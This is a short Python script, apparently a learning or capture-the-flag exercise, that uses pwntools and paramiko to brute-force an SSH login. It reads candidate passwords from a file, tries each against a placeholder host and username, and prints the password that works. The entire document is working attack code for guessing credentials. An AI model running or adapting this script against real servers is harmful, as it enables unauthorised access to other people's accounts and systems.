from pwn import *
import paramiko # for error handling

# global variables
host = 'IP'
username = 'name'
attempts = 0

# iterating over passwords
with open("file", "r") as password_list:
  for password in password_list:
    password = password.strip("\n")
    try: # for handling authentication errors
      print("[{}] Attempting password: '{}'!".format(attempts, password)) #trying to authenticate first
      response = ssh(host=host, user=username, password=password, timeout=1)
      if response.connected(): # if connection successful
        print("[>] Valid password found: '{}'!".format(password))
        response.close()
        break
      response.close() # this closes the connection is password is invalid, but starts the loop again
    except paramiko.ssh_exception.AuthenticationException: # the error we are catching
      print("[X] Invalid password!")
    attempts += 1
